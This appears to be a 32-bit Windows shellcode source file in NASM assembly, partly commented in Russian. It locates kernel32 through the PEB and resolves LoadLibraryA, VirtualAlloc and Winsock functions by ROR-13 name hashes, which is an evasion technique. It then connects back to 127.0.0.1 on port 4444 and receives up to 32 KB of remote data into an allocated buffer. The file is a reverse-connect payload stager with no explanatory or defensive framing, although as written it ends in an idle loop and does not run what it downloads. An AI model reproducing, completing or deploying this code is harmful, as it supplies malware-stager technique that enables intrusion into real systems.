BITS 32

LoadLibraryA_hash       equ     0xec0e4e8e
VirtualAlloc_hash       equ     0x91afca54

WSAStartup_hash         equ     0x3bfcedcb
WSASocketA_hash         equ     0xadf509d9
connect_hash            equ     0x60aaf9ec
recv_hash               equ     0xe71819b6

PAPA                    equ     0x41504150
MAMA                    equ     0x414D414D

global _entry

section .text
_entry:
    xor eax, eax
    mov al, 0x30
get_kernel32_address:
    mov ebx, [fs:eax]               ; PEB
    mov ebx, dword [ebx + 0x0C]     ; PEB->PEB_LDR_DATA
	mov ebx, dword [ebx + 0x14]     ; (LDR_MODULE) PEB->PEB_LDR_DATA.InMemoryOrderModuleList.Flink
    mov ebx, [ebx]                  ; 2nd node - ntdll.dll
    mov ebx, [ebx]                  ; 3rd node - kernel32.dll
    mov ebx, [ebx + 16]             ; ebx = kernel32 address

; *************************
; * [ebp - 4] LoadLibraryA
; * [ebp - 8] VirtualAlloc
; *************************
get_kernel32_procs:
    push PAPA
    push LoadLibraryA_hash
    push VirtualAlloc_hash
    mov ebp, esp
    jmp short get_proc_address
get_kernel32_procs_end:

    xor ax, ax
    push ax
    push word 0x6c6c
    push dword 0x642e3233
    push dword 0x5f327377
    push esp
    call [ebp - 4] ; LoadLibraryA("ws2_32.dll")
    xchg eax, ebx

; *************************
; * [edi - 4] WSAStartup
; * [edi - 8] WSASocketA
; * [edi - 12] connect
; * [edi - 16] recv
; *************************
get_ws2_32_procs:
    push MAMA
    push WSAStartup_hash
    push WSASocketA_hash
    push connect_hash
    push recv_hash

    mov edi, esp
    push ebp
    mov ebp, edi
    jmp short get_proc_address
get_ws2_32_procs_end:
    mov edi, ebp
    pop ebp


; =======================================================================
    jmp short skip1
get_kernel32_procs_end_middle:
    jmp short get_kernel32_procs_end
get_proc_address:
    mov edi, [ebx + 0x3c]           ; RVA Адрес PE заголовка
    mov edi, [ebx + edi + 0x78]     ; RVA Адрес EXPORT таблицы
    add edi, ebx                    ; VA Адрес Таблицы
    
    mov esi, dword [edi + 0x20]   ; RVA таблицы ИМЕН процедур
	add esi, ebx                  ; VA таблицы ИМЕН процедур
    mov ecx, dword [edi + 0x18]   ; Количество экспортируемых ИМЕН

search_proc:
    jecxz fatal_error
    dec ecx

    push esi
    mov esi, [esi + ecx*4]
    add esi, ebx
    
    xor edx, edx                ; edx = 0 (Хеш)
    xor eax, eax                ; eax = 0
cstr_hashcode:
    lodsb                       ; al = byte [esi], esi = esi + 1
    test al, al
	jz short cstr_hashcode_compare
	ror edx, 0xd
	add edx, eax
	jmp short cstr_hashcode

cstr_hashcode_compare:
    pop esi
    cmp edx, [ebp]
    je short search_proc_ok
    jmp short search_proc

search_proc_ok:
    xor esi, esi
    mov eax, dword [edi + 0x1c]	    ; RVA таблицы АДРЕСОВ процедур
	add eax, ebx                    ; VA таблицы АДРЕСОВ процедур
    mov edx, dword [edi + 0x24]	    ; RVA таблицы ОРДИНАЛОВ процедур
	add edx, ebx                    ; VA таблицы ОРДИНАЛОВ процедур
    mov si, word [edx + ecx*2]
    mov eax, dword [eax + esi*4]
    add eax, ebx
    
    mov [ebp], eax
    add ebp, 4

    cmp dword [ebp], PAPA
    je short get_kernel32_procs_end_middle

    cmp dword [ebp], MAMA
    je short get_ws2_32_procs_end

    jmp short get_proc_address
    
fatal_error:
    xor eax, eax
    push eax
    ret
skip1:
; =======================================================================

    mov ax, word 0x0190
    movzx eax, ax
    sub esp, eax            ; Пространство для WSADATA
    mov ax, word 0x0202     ; Версия 2.2 библиотеки ws2_32
    push dword esp
    push dword eax
    call [edi - 4]          ; WSAStartup( 0x0202, &WSAData );

    push eax               
    push eax
    push eax
    push eax
    inc eax                 ; eax = 0x00000001 = SOCK_STREAM
    push eax                ; push SOCK_STREAM
    inc eax                 ; eax = 0x00000002 = AF_INET
    push eax                ; push AF_INET
    call [edi - 8]          ; WSASocketA( AF_INET, SOCK_STREAM, 0, 0, 0, 0 );
    xchg esi, eax           ; Сохранить сокет в esi

    push byte 0x05         ; Попыток соединения
    push 0x0100007F        ; IP хоста 127.0.0.1
    push 0x5C110002        ; family AF_INET и порт 4444
    mov edx, esp           ; Сохранить указатель на struct sockaddr

connect:
    push edx

    push dword 16          ; length of the sockaddr struct
    push edx               ; pointer to the sockaddr struct
    push esi               ; the socket
    call [edi - 12]        ; connect( s, &sockaddr, 16 );

    pop edx
    test eax,eax           ; non-zero means a failure
    jz short connected
    
    dec byte [edx + 8]
    jnz short connect
    jmp short fatal_error

connected:
    xor eax, eax
    inc eax
    shl eax, 2          ; PAGE_READWRITE
    push eax
    shl eax, 10         ; MEM_COMMIT
    push eax
    shl eax, 3          ; 32 KB
    push eax
    xor eax, eax        ; NULL
    push eax
    call [ebp - 8]      ; VirtualAlloc(NULL, size, MEM_COMMIT, PAGE_READWRITE)

    xor ebx, ebx        ; 0
    push ebx
    inc ebx
    shl ebx, 15         ; 32 KB
    push ebx
    push eax            ; &buffer
    push esi            ; socket
    call [edi - 16]     ; recv(socket, &buffer, buffer_len, 0)

    jmp short $